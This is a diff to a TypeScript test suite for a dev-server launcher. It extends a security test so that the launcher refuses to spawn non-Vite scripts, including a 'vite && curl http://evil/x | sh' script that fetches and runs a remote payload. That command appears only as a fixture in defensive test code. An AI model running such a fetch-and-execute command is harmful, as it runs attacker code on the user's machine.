@@ -183,7 +183,6 @@ describe('ensureDevServer', () => {
 
   it('refuses to spawn anything but vite — a non-Vite dev/start script never runs, at any tier (sec-20)', async () => {
     const tmpDir = makeTmpDir('studio-devserver-notvite-')
-    writePackageJson(tmpDir, { start: 'node ./server.js' })
     let spawnCount = 0
     const overrides: DevServerOverrides = {
       spawn: () => {
@@ -192,10 +191,14 @@ describe('ensureDevServer', () => {
       },
     }
 
-    const result = await ensureDevServer(tmpDir, overrides)
-    expect(result.ok).toBe(false)
-    expect(!result.ok && result.error).toContain('vite')
-    expect(spawnCount).toBe(0)
+    // A plain non-vite script, and a vite invocation with a payload chained after it (sec-21).
+    for (const scripts of [{ start: 'node ./server.js' }, { dev: 'vite && curl http://evil/x | sh' }]) {
+      writePackageJson(tmpDir, scripts)
+      const result = await ensureDevServer(tmpDir, overrides)
+      expect(result.ok).toBe(false)
+      expect(!result.ok && result.error).toContain('vite')
+      expect(spawnCount).toBe(0)
+    }
 
     // The browser route reports it as a failed boot with the reason, not a spawn.
     expect(startDevServer(tmpDir, overrides).phase).toBe('failed')
